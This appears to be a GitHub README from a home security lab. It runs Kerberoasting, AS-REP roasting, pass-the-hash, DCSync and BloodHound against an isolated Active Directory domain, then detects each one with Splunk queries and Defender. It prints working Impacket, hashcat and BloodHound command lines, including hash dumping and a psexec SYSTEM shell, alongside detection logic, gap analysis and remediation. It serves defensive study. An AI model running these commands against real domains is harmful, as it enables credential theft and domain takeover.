# Active Directory Attack & Detection Lab - Splunk SIEM + Microsoft Defender

**Tools:** Impacket · BloodHound · Splunk · Microsoft Defender for Business · Windows Server 2022 · Windows 10 · Kali Linux · VMware Workstation  
**MITRE ATT&CK:** T1558.003 · T1558.004 · T1550.002 · T1003.006 · T1069 · T1087  
**Type:** Home Lab · Blue Team · SOC Analysis · Active Directory · Identity Attacks · SIEM Detection

> This lab was independently designed and built as a personal home lab project - not part of coursework. All infrastructure, attack simulation, detection logic, and documentation were self-directed.

> ⚠️ **Disclaimer:** This project was conducted entirely in an isolated VMware lab environment for educational purposes only. No real systems, networks, or individuals were targeted. All IP addresses are private VMware Host-Only addresses that exist solely within the local lab.

---

## Overview

This project simulates a full Active Directory attack chain against an enterprise domain environment, then investigates the resulting evidence from the defender and analyst seat. The lab extends the previous Caldera C2 detection lab by adding an identity-focused attack layer - targeting Kerberos, credential storage, and AD replication protocols that leave no endpoint footprint.

The goal was to answer a question the previous lab raised: Microsoft Defender for Business missed data staging and archiving because those techniques fall below its detection threshold. What fills that gap? A properly configured SIEM with tuned audit policies and Windows Event ID monitoring.

**What this lab demonstrates end-to-end:**

1. Configure advanced audit logging on the DC to make identity attacks visible
2. Register SPNs on service accounts to enable Kerberoasting
3. Deploy Splunk Universal Forwarders on DC and workstation - building a live SIEM pipeline
4. Verify Microsoft Defender for Business is active alongside the SIEM layer
5. Execute five AD attack techniques from Kali Linux using Impacket and BloodHound
6. Investigate each attack's evidence in Splunk using targeted SPL queries
7. Document what fired, what didn't, and why - with formal detection gap analysis

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    VMware Host-Only Network                     │
│                      192.168.255.0/24                           │
│                                                                 │
│  ┌──────────────────┐          ┌──────────────────────────────┐ │
│  │  Windows Server  │          │         Kali Linux           │ │
│  │      2022        │          │   Impacket + BloodHound      │ │
│  │  DC: lab.local   │◄────────►│     192.168.255.135          │ │
│  │  192.168.255.130 │          │     Attacker Machine         │ │
│  │  AD DS / DNS     │          └──────────────────────────────┘ │
│  └──────────────────┘                                           │
│           │                                                     │
│           │ Domain                                              │
│           ▼                                                     │
│  ┌──────────────────────────────────┐                           │
│  │     Windows 10 (CORP-PC01)       │                           │
│  │  desktop-4fnnse5.lab.local       │                           │
│  │     192.168.255.132              │                           │
│  │  Domain-joined · MDE Onboarded   │                           │
│  └──────────────────────────────────┘                           │
│           │                                                     │
│           │ Splunk Universal Forwarder (port 9997)              │
│           ▼                                                     │
│  ┌──────────────────────────────────┐                           │
│  │     Ubuntu — Splunk SIEM         │                           │
│  │     192.168.255.131:8000         │                           │
│  │     Index: wineventlog           │                           │
│  └──────────────────────────────────┘                           │
│                                                                 │
│  ┌──────────────────────────────────┐                           │
│  │  Microsoft Defender for Business │                           │
│  │     security.microsoft.com       │                           │
│  │    Cloud EDR · Incident Portal   │                           │
│  └──────────────────────────────────┘                           │
└─────────────────────────────────────────────────────────────────┘
```

| VM | OS | IP | Role |
|---|---|---|---|
| Windows Server 2022 | Server 2022 | 192.168.255.130 | Domain Controller (lab.local) |
| Windows 10 | Windows 10 22H2 | 192.168.255.132 | Victim Endpoint (domain-joined) |
| Kali Linux | Kali Rolling | 192.168.255.135 | Attacker Machine |
| Ubuntu | Ubuntu 22.04 | 192.168.255.131 | Splunk SIEM |
| Cloud Portal | Microsoft Defender | security.microsoft.com | EDR Detection Layer |

---

## Pre-Attack Setup

### 1. Advanced Audit Logging on DC

By default Windows does not log the Event IDs generated by AD attacks. These policies were enabled before running any attacks to ensure the SIEM would have visibility.

```powershell
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
```

### 2. SPN Registration on Service Accounts

SPNs were registered on two service accounts to make Kerberoasting possible — replicating how real environments look when running web and database services.

```powershell
Set-ADUser -Identity jsmith -ServicePrincipalNames @{Add="HTTP/corpweb.lab.local"}
Set-ADUser -Identity mjones -ServicePrincipalNames @{Add="MSSQLSvc/sqlserver.lab.local"}
```

### 3. Splunk SIEM Pipeline

Splunk was deployed on Ubuntu with Universal Forwarders installed on both the DC and CORP-PC01, shipping Windows Security logs to the `wineventlog` index in real time.

**Receiver on Ubuntu (port 9997):**
```bash
sudo /opt/splunk/bin/splunk enable listen 9997 -auth admin:password
```

**inputs.conf on each Windows machine:**
```
[WinEventLog://Security]
index = wineventlog
disabled = false
start_from = oldest
current_only = 0
checkpointInterval = 5
```

**outputs.conf on each Windows machine:**
```
[tcpout]
defaultGroup = default-autolb-group

[tcpout:default-autolb-group]
server = 192.168.255.131:9997
```

**Result:** Both hosts confirmed in Splunk with 4,774+ events indexed before attacks began.

```
index=wineventlog | stats count by host
```
```
host                  count
WIN-I4UHLQF702E       4298
DESKTOP-4FNNSE5       476
```

### 4. Microsoft Defender for Business

CORP-PC01 was confirmed Active and Onboarded in the Defender portal prior to attacks. The DC appeared in the portal but was not fully onboarded, a finding that became significant during the Pass-the-Hash attack.

---

## Attacks Executed

### Attack 1 - Kerberoasting (T1558.003)

**How it works:** Any authenticated domain user can request Kerberos service tickets for accounts with SPNs registered. The DC encrypts these tickets with the service account's password hash. The attacker takes the ticket completely offline and cracks it - no lockout, no further network contact, no suspicion raised.

**Command:**
```bash
impacket-GetUserSPNs lab.local/jsmith:'Password@123!' \
  -dc-ip 192.168.255.130 -request -outputfile kerberoast-hashes.txt
```

**Result:** Two hashes captured for jsmith and mjones. Both cracked to `Password@123!`.

```bash
hashcat -m 13100 kerberoast-hashes.txt smalllist.txt --force
# Status: Cracked — 2/2 (100%)
```

**Splunk Detection:**
```
index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17
| table _time, Account_Name, Service_Name, Client_Address
| sort -_time
```

Two Event ID 4769s fired from 192.168.255.135 with encryption type 0x17 (RC4). All legitimate traffic in the session used 0x12 (AES). RC4 requested by a user account from a non-domain IP is the fingerprint.

**Defender:** No alert. Pure network attack with no endpoint footprint.

---

### Attack 2 - AS-REP Roasting (T1558.004)

**How it works:** When pre-authentication is disabled on an account, the DC responds to authentication requests without requiring proof of identity. An attacker requests an AS-REP for that account using only the username, no password needed. The encrypted response is crackable offline.

**Setup:**
```powershell
Set-ADAccountControl -Identity mjones -DoesNotRequirePreAuth $true
```

**Command:**
```bash
impacket-GetNPUsers lab.local/ -usersfile users.txt \
  -dc-ip 192.168.255.130 -format hashcat -outputfile asrep-hashes.txt
```

**Result:** Hash captured for mjones with zero credentials provided. jsmith and Administrator rejected because pre-auth was still required on those accounts.

**Splunk Detection:**
```
index=wineventlog EventCode=4768 Pre_Authentication_Type=0
| table _time, Account_Name, Client_Address
| sort -_time
```

Event ID 4768 fired with Pre_Authentication_Type=0 from Kali's IP - confirming no credentials were provided or required.

**Defender:** No alert.

---

### Attack 3 - Pass-the-Hash (T1550.002)

**How it works:** Windows NTLM authentication transmits a hash rather than the plaintext password. Pass-the-Hash uses the raw hash directly for authentication - no cracking required. The attacker steals a hash from one machine and authenticates to another as that user.

**Step 1 - Dump hashes from DC:**
```bash
impacket-secretsdump 'lab.local/Administrator:Admin@123!'@192.168.255.130
```

**Result:** All domain hashes extracted including Administrator, krbtgt, jsmith, mjones, sadmin, and both machine accounts.

**Step 2 - Authenticate using hash only:**
```bash
impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:7c6cab7ad63589567f0f1692851e0875' 'Administrator@192.168.255.130'
```

**Result:**
```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
WIN-I4UHLQF702E
```

Full SYSTEM shell on the Domain Controller - no password ever used or cracked.

**Splunk Detection:**
```
index=wineventlog EventCode=4624 Logon_Type=3
| rex field=_raw "Source Network Address:\s+(?<src_ip>\S+)"
| where src_ip="192.168.255.135"
| table _time, Account_Name, src_ip, ComputerName
| sort -_time
```

Seven Logon Type 3 events from 192.168.255.135 as Administrator within seconds - programmatic authentication pattern, not human behavior.

**Defender on CORP-PC01:** Blocked psexec payload silently. `STATUS_VIRUS_INFECTED` error returned. No portal alert raised - automatic remediation with zero analyst visibility. Documented as a detection gap.

**Defender on DC:** Not fully onboarded. Attack succeeded with no EDR coverage.

---

### Attack 4 - DCSync (T1003.006)

**How it works:** Domain Controllers replicate credential data using the DRSUAPI protocol. DCSync abuses this by impersonating a DC and requesting replication of all credential data from a real DC, which complies because replication is legitimate behavior.

**Command:**
```bash
impacket-secretsdump 'lab.local/Administrator:Admin@123!'@192.168.255.130 -just-dc
```

**Result:** Every account's NTLM hash and Kerberos keys extracted via DRSUAPI replication - including krbtgt.

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:993431c01d50acd33362d46341e41c2c:::
```

The krbtgt hash enables Golden Ticket attacks - forged Kerberos tickets for any user with any privileges that never expire. This represents permanent domain compromise.

**Splunk Detection:**
```
index=wineventlog EventCode=4662
| table _time, Account_Name, Properties
| sort -_time
```

24 Event ID 4662s fired within milliseconds, all exercising replication GUID `{19195a5b-6da0-11d0-afd3-00c04fd930c9}` (DS-Replication-Get-Changes-All). Burst pattern distinguishes automated DCSync from legitimate scheduled DC replication.

**Defender:** No alert.

---

### Attack 5 - BloodHound AD Enumeration (T1069, T1087)

**How it works:** BloodHound queries AD via LDAP to collect every user, group, computer, GPO, ACL, and session relationship in the domain. Graph analysis then identifies every privilege escalation path to Domain Admin - chains of permissions that individually look harmless but together represent a full compromise path.

**Command:**
```bash
bloodhound-python -u jsmith -p 'Password@123!' \
  -d lab.local -dc WIN-I4UHLQF702E.lab.local -ns 192.168.255.130 -c all
```

**Result:**
```
Found 1 domains
Found 2 computers
Found 7 users
Found 52 groups
Found 2 GPOs
Found 19 containers
Done in 00M 04S
```

Entire domain mapped in 4 seconds using only jsmith credentials.

**Splunk Detection:** Nothing. Zero events.

**Defender:** Nothing.

**Why nothing fired:** BloodHound uses LDAP, not Kerberos or replication protocols. The configured audit policies cover Kerberos and directory replication, not LDAP query volume. Catching BloodHound requires LDAP query logging, network-level detection, or Microsoft Defender for Identity.

---

## Detection Summary

| Attack | MITRE | Event ID | Splunk | Defender |
|---|---|---|---|---|
| Kerberoasting | T1558.003 | 4769 (0x17) | ✅ Detected | ❌ No alert |
| AS-REP Roasting | T1558.004 | 4768 (PreAuth=0) | ✅ Detected | ❌ No alert |
| Pass-the-Hash | T1550.002 | 4624 (Type 3) | ✅ Detected | ⚠️ Blocked silently |
| DCSync | T1003.006 | 4662 (replication) | ✅ Detected | ❌ No alert |
| BloodHound | T1069/T1087 | None | ❌ No alert | ❌ No alert |

---

## Detection Gaps

**Gap 1 - BloodHound completely invisible**  
LDAP enumeration generated zero events in Splunk or Defender. An attacker using only jsmith credentials mapped the entire domain in 4 seconds with no evidence left behind. This is the most critical gap identified in the lab.

**Gap 2 - Defender remediated psexec silently**  
When Defender blocked the psexec payload on CORP-PC01, it cleaned it up automatically without raising a portal alert. An analyst working the queue would never know lateral movement was attempted. Silent remediation without notification is a visibility gap.

**Gap 3 - DC not fully onboarded to Defender**  
The Domain Controller - the most critical asset in any AD environment, was not fully onboarded to Defender for Business. Pass-the-Hash and DCSync both targeted the DC directly and generated no EDR alerts.

**Gap 4 - RC4 encryption permitted**  
Kerberos RC4 (0x17) was allowed in the environment, making Kerberoast hashes crackable offline. AES-only enforcement does not prevent ticket theft but makes offline cracking computationally infeasible with strong passwords.

**Gap 5 - Weak service account passwords**  
Both service accounts used `Password@123!` - found in standard breach wordlists. Hashes cracked instantly. In a real environment this is immediate credential compromise after Kerberoasting.

**Gap 6 - Pre-authentication disabled**  
mjones had DoesNotRequirePreAuth enabled, allowing AS-REP Roasting with zero credentials. This setting should never be enabled without documented business justification.

---

## Remediation & Mitigation

**Immediate (if real incident):**
- Reset krbtgt password twice: once immediately, once 10 hours later to invalidate any forged Golden Tickets
- Reset all service account passwords
- Isolate any machine Kali authenticated to
- Audit all privileged account activity for the past 30 days

**Short term hardening:**
- Enforce AES-only Kerberos encryption via Group Policy - disable RC4
- Re-enable pre-authentication on all accounts
- Implement Group Managed Service Accounts (gMSA) - auto-rotating 240-character passwords
- Fully onboard DC to Defender for Business
- Configure Defender to alert on all remediation actions, not just active threats

**Long term detection improvements:**
- Deploy Microsoft Defender for Identity - purpose-built to detect Kerberoasting, AS-REP Roasting, DCSync, and LDAP enumeration at the identity layer
- Enable LDAP query logging on the DC
- Build Splunk alerts on the detection queries in this report
- Run BloodHound regularly as a defender to find and close privilege escalation paths proactively

---

## SPL Detection Queries

```spl
# Kerberoasting - RC4 ticket requests
index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17
| table _time, Account_Name, Service_Name, Client_Address
| sort -_time

# AS-REP Roasting - no pre-auth required
index=wineventlog EventCode=4768 Pre_Authentication_Type=0
| table _time, Account_Name, Client_Address
| sort -_time

# Pass-the-Hash - external network logons
index=wineventlog EventCode=4624 Logon_Type=3
| rex field=_raw "Source Network Address:\s+(?<src_ip>\S+)"
| where src_ip!="::1" AND src_ip!="-"
| table _time, Account_Name, src_ip, ComputerName
| sort -_time

# DCSync - replication permission burst
index=wineventlog EventCode=4662
| table _time, Account_Name, Properties
| sort -_time

# Suspicious logon volume from single external IP
index=wineventlog EventCode=4624 Logon_Type=3
| rex field=_raw "Source Network Address:\s+(?<src_ip>\S+)"
| stats count by src_ip
| where count > 5
| sort -count
```

---

## Key Findings

| Metric | Value |
|---|---|
| Attacks executed | 5 |
| MITRE ATT&CK techniques covered | 6 |
| Splunk detections generated | 4 |
| Defender alerts generated | 0 |
| Attacks with zero detection | 1 (BloodHound) |
| Hashes cracked | 2 (jsmith, mjones) |
| Highest privilege achieved | NT AUTHORITY\SYSTEM on DC |
| Domain compromise level | Full krbtgt hash obtained |

---

## Roadblocks Encountered

Documenting what broke and how it was fixed is part of the learning - these aren't failures, they're real engineering problems.

| Roadblock | Resolution |
|---|---|
| `auditpol` failed for "Account Logon" category | Targeted individual subcategories directly |
| Splunk forwarder auth failure — password locked | Deleted passwd file, rewrote user-seed.conf before first boot |
| inputs.conf CLI command failed on Windows | Wrote inputs.conf directly via PowerShell Set-Content |
| CORP-PC01 logs not appearing in Splunk | Rewrote inputs.conf cleanly, restarted forwarder |
| `!` in passwords broke bash commands | Wrapped all credentials in single quotes |
| CORP-PC01 IP had changed from lab setup | Ran ipconfig to find current IP |
| SMB firewall rules disabled on CORP-PC01 | Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing" |
| Defender blocked secretsdump on CORP-PC01 | Targeted DC instead - not fully onboarded |
| BloodHound DNS timeout | Added -ns flag pointing directly at DC IP |
| VMware crashed during BloodHound GUI install | Reverted to pre-attack snapshot - data collection confirmed via JSON files |

---

## Screenshots

### Splunk Detection Dashboard - Attacks 1 & 2 (Kerberoasting · AS-REP Roasting)
![Splunk Dashboard Attacks 1 2](screenshots/Splunk%20Dash%20Board%20Attacks%201-2.png)

*Event ID 4769 with RC4 encryption (0x17) confirming Kerberoasting; Event ID 4768 with Pre_Authentication_Type=0 confirming AS-REP Roasting - both sourced from Kali IP 192.168.255.135*

---

### Splunk Detection Dashboard - Attack 3 (Pass-the-Hash)
![Splunk Dashboard Attack 3](screenshots/Splunk%20Dashboard%20Attack%203.png)

*Seven Logon Type 3 events from 192.168.255.135 as Administrator within seconds - programmatic authentication pattern indicative of Pass-the-Hash lateral movement*

---

### Splunk Detection Dashboard - Attacks 4 & 5 (DCSync · BloodHound)
![Splunk Dashboard Attacks 4, 5](screenshots/Splunk%20Dashboard%20Attacks%204%2C%205.png)

*24 Event ID 4662s in milliseconds with DS-Replication-Get-Changes-All GUID confirming DCSync; zero events for BloodHound LDAP enumeration - gap documented in Detection Gaps section*

---

## How This Extends the Previous Lab

The [previous lab](https://github.com/DurgaRamireddy/enterprise-threat-detection-lab) identified a key gap - Microsoft Defender for Business missed data staging and archiving techniques because they fall below its detection threshold. The conclusion was: you need a SIEM layer with Windows Event Log forwarding to close that gap.

This lab builds exactly that layer and stress tests it against identity-based attacks. The result confirms the finding while adding a new one: even with a properly configured SIEM, LDAP-based enumeration tools like BloodHound remain completely invisible without additional tooling like Microsoft Defender for Identity.

Each lab answers a question and raises a new one. That's the point.

---

## Skills Demonstrated

- Active Directory attack techniques - Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync, AD enumeration
- SIEM deployment and pipeline configuration - Splunk Universal Forwarder, inputs/outputs, index management
- Windows audit policy configuration - subcategory-level tuning for specific Event IDs
- SPL query writing - extraction, filtering, correlation across event types
- Detection gap analysis - documenting what fired, what didn't, and why
- Layered detection architecture - SIEM + EDR working together and independently
- Incident documentation - formal report writing with timeline, findings, and remediation

---

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [BloodHound Documentation](https://bloodhound.readthedocs.io)
- [Splunk Universal Forwarder Docs](https://docs.splunk.com/Documentation/Forwarder)
- [Windows Security Event IDs](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
- [Microsoft Defender for Business](https://docs.microsoft.com/en-us/microsoft-365/security/defender-business/)

---

**Author:** Durga Sai Sri Ramireddy | MS Cybersecurity, University of Houston  
[![LinkedIn](https://img.shields.io/badge/-LinkedIn-0072b1?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/durga-ramireddy)
[![GitHub](https://img.shields.io/badge/-GitHub-181717?style=flat&logo=github&logoColor=white)](https://github.com/DurgaRamireddy)
